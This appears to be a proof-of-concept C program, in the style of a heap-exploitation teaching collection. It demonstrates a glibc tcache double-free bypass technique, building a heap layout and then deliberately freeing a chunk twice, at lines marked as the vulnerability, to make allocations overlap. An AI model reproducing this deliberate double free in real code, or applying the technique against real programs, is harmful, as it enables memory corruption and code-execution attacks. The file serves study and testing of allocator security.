
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>
#include <string.h>
int main()
{
    /*
     * This attack should bypass the restriction introduced in
     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
     * If the libc does not include the restriction, you can simply double free the victim and do a
     * simple tcache poisoning
     * And thanks to @anton00b and @subwire for the weird name of this technique */
     // introduction
     // prepare the target
    intptr_t stack_var[4];
    // prepare heap layout
    intptr_t *x[7];
    for (int i = 0; i < sizeof(x) / sizeof(intptr_t *); i++) {
        x[i] = malloc(0x100);
    }
    intptr_t *prev = malloc(0x100);
    intptr_t *a = malloc(0x100);
    malloc(0x10);
    // cause chunk overlapping
    for (int i = 0; i < 7; i++) {
        free(x[i]);
    }
    free(a);
    free(prev);
    // low address  ->  high address
    // |----prev-----|------a------|
    // |-----b-------------|
    malloc(0x100);
    /*VULNERABILITY*/
    free(a);// a is already freed
    /*VULNERABILITY*/
    intptr_t *b = malloc(0x120);
    memset(b, 'A', 0x120);
    assert(strstr((char *)a, "AAAA") != NULL);
    return 0;
}
